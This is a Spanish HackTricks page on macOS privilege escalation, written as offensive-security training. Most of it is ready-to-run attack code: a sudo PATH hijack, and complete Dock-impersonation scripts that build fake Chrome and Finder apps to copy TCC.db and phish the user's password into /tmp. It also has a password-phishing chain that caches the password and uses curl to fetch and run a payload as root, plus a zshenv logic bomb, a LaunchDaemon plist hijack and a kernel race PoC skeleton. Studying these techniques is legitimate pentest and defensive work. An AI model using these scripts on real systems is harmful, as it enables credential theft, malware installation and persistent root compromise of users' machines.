# Escalada de privilegios en macOS

{{#include ../../banners/hacktricks-training.md}}

## Escalada de privilegios de TCC

Si has llegado aquí buscando una escalada de privilegios de TCC, ve a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Ten en cuenta que **la mayoría de los trucos de escalada de privilegios que afectan a Linux/Unix también afectarán a las máquinas MacOS**. Consulta:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interacción del usuario

### Sudo Hijacking

Puedes encontrar la técnica original de [Sudo Hijacking en la publicación sobre Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Sin embargo, macOS **mantiene** el **`PATH`** del usuario cuando este ejecuta **`sudo`**. Esto significa que otra forma de lograr este ataque sería **secuestrar otros binarios** que la víctima seguirá ejecutando al **usar sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Ten en cuenta que un usuario que utiliza la terminal probablemente tendrá **Homebrew instalado**. Por lo tanto, es posible secuestrar binarios en **`/opt/homebrew/bin`**.

### Suplantación del Dock

Mediante **social engineering**, podrías **suplantar, por ejemplo, Google Chrome** dentro del Dock y ejecutar realmente tu propio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algunas sugerencias:

- Comprueba en el Dock si hay un Chrome y, en ese caso, **elimina** esa entrada y **añade** la entrada de Chrome **falsa** en la **misma posición** dentro del array del Dock.

<details>
<summary>Script de suplantación de Chrome en el Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algunas sugerencias:

- **No puedes eliminar Finder del Dock**, así que, si vas a añadirlo al Dock, podrías colocar el Finder falso justo al lado del real. Para ello, necesitas **añadir la entrada del Finder falso al principio del array del Dock**.
- Otra opción es no colocarlo en el Dock y simplemente abrirlo; que aparezca «Finder asking to control Finder» no resulta tan extraño.
- Otra opción para **escalar a root sin solicitar** la contraseña mediante un cuadro horrible consiste en hacer que Finder solicite realmente la contraseña para realizar una acción privilegiada:
- Pedir a Finder que copie un nuevo archivo **`sudo`** en **`/etc/pam.d`** (el aviso que solicita la contraseña indicará que «Finder quiere copiar sudo»).
- Pedir a Finder que copie un nuevo **Authorization Plugin** (podrías controlar el nombre del archivo para que el aviso que solicita la contraseña indique que «Finder quiere copiar Finder.bundle»).

<details>
<summary>Script de impersonación del Dock de Finder</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing de solicitud de contraseña + reutilización de sudo

El malware abusa con frecuencia de la interacción del usuario para **capturar una contraseña con capacidad para usar sudo** y reutilizarla mediante programación. Un flujo común:

1. Identificar al usuario conectado con `whoami`.
2. **Repetir las solicitudes de contraseña** hasta que `dscl . -authonly "$user" "$pw"` devuelva éxito.
3. Almacenar en caché la credencial (por ejemplo, `/tmp/.pass`) y ejecutar acciones privilegiadas con `sudo -S` (contraseña mediante stdin).

Cadena mínima de ejemplo:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La contraseña robada puede reutilizarse para **borrar la cuarentena de Gatekeeper con `xattr -c`**, copiar LaunchDaemons u otros archivos privilegiados y ejecutar etapas adicionales de forma no interactiva.

## Vectores específicos de macOS más recientes (2023–2025)

### `AuthorizationExecuteWithPrivileges` todavía se puede utilizar

`AuthorizationExecuteWithPrivileges` quedó obsoleto en la versión 10.7, pero **todavía funciona en Sonoma/Sequoia**. Muchos actualizadores comerciales invocan `/usr/libexec/security_authtrampoline` con una ruta no confiable. Si el binario objetivo permite escritura al usuario, puedes implantar un troyano y aprovechar el prompt legítimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combínalo con los **masquerading tricks anteriores** para presentar un diálogo de contraseña convincente.


### Triage de Privileged helper / XPC

Muchos privescs modernos de terceros para macOS siguen el mismo patrón: un **root LaunchDaemon** expone un **Mach/XPC service** desde **`/Library/PrivilegedHelperTools`**; después, el helper no valida al client, lo valida **demasiado tarde** (PID race) o expone un **root method** que consume una **user-controlled path/script**. Esta es la clase de bug presente en muchos bugs recientes de helpers en VPN clients, game launchers y updaters.<sup>[4]</sup>

Checklist rápido de triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Presta especial atención a los helpers que:

- siguen aceptando solicitudes **después de la desinstalación** porque el job permaneció cargado en `launchd`
- ejecutan scripts o leen la configuración desde **`/Applications/...`** u otras rutas en las que los usuarios no root pueden escribir
- dependen de una validación del peer basada en **PID** o únicamente en **bundle-id**, que puede estar sujeta a race conditions

Para obtener más detalles sobre los bugs de autorización de los helpers, consulta [esta página](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herencia del entorno de scripts de PackageKit (CVE-2024-27822)

Hasta que Apple lo solucionó en **Sonoma 14.5**, **Ventura 13.6.7** y **Monterey 12.7.5**, las instalaciones iniciadas por el usuario mediante **`Installer.app`** / **`PackageKit.framework`** podían ejecutar **scripts PKG como root dentro del entorno del usuario actual**. Esto significa que un paquete que usara **`#!/bin/zsh`** cargaría el **`~/.zshenv`** del atacante y lo ejecutaría como **root** cuando la víctima instalara el paquete.<sup>[3]</sup>

Esto resulta especialmente interesante como **logic bomb**: solo necesitas un foothold en la cuenta del usuario y un archivo de inicio del shell en el que se pueda escribir; después, esperas a que el usuario ejecute cualquier instalador vulnerable **basado en zsh**. Por lo general, esto no se aplica a las implementaciones de **MDM/Munki**, porque se ejecutan dentro del entorno del usuario root.<sup>[3]</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Si quieres profundizar en el abuso específico de instaladores, consulta también [esta página](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Hijacking de un plist de LaunchDaemon (patrón CVE-2025-24085)

Si un plist de LaunchDaemon o su objetivo `ProgramArguments` es **modificable por el usuario**, puedes escalar privilegios reemplazándolo y forzando a launchd a recargarlo:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Esto refleja el patrón de exploit publicado para **CVE-2025-24085**, en el que se abusó de un plist escribible para ejecutar código del atacante como root.

### Carrera de credenciales de XNU SMR (CVE-2025-24118)

Una **condición de carrera en `kauth_cred_proc_update`** permite a un atacante local corromper el puntero de credenciales de solo lectura (`proc_ro.p_ucred`) ejecutando bucles de `setgid()`/`getgid()` entre varios hilos hasta que se produzca un `memcpy` fragmentado. Una corrupción exitosa proporciona **uid 0** y acceso a la memoria del kernel. Estructura mínima del PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Combínalo con heap grooming para colocar datos controlados donde el puntero vuelva a leerlos. En builds vulnerables, esto proporciona un **local kernel privesc** fiable sin necesidad de un bypass de SIP.<sup>[2]</sup>

### Bypass de SIP mediante Migration assistant ("Migraine", CVE-2023-32369)

Si ya tienes root, SIP sigue bloqueando las escrituras en ubicaciones del sistema. El bug **Migraine** abusa del entitlement de Migration Assistant `com.apple.rootless.install.heritable` para generar un proceso hijo que hereda el bypass de SIP y sobrescribe rutas protegidas (por ejemplo, `/System/Library/LaunchDaemons`).<sup>[1]</sup> La cadena:

1. Obtener root en un sistema activo.
2. Activar `systemmigrationd` con un estado manipulado para ejecutar un binario controlado por el atacante.
3. Usar el entitlement heredado para modificar archivos protegidos por SIP y mantener la persistencia incluso después de reiniciar.

### Smuggling de expresiones NSPredicate/XPC (clase de bugs CVE-2023-23530/23531)

Varios daemons de Apple aceptan objetos **NSPredicate** mediante XPC y solo validan el campo `expressionType`, que está controlado por el atacante. Al crear un predicate que evalúe selectores arbitrarios, puedes conseguir **ejecución de código en servicios XPC root/system** (por ejemplo, `coreduetd`, `contextstored`). Cuando se combina con un escape inicial del sandbox de la aplicación, esto permite una **escalada de privilegios sin avisos al usuario**. Busca endpoints XPC que deserialicen predicates y no dispongan de un visitor robusto.

## TCC - Escalada de privilegios root

### CVE-2020-9771 - bypass de TCC de mount_apfs y escalada de privilegios

**Cualquier usuario** (incluso los que no tienen privilegios) puede crear y montar un snapshot de Time Machine con `-o noowners` y **acceder a TODOS los archivos** de ese snapshot, omitiendo las comprobaciones de propiedad del volumen activo. El único privilegio necesario es que la aplicación utilizada (como `Terminal`) tenga **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Los comandos y la explicación completa se encuentran en la página de bypasses de TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Información sensible

Esto puede ser útil para escalar privilegios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referencias

- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
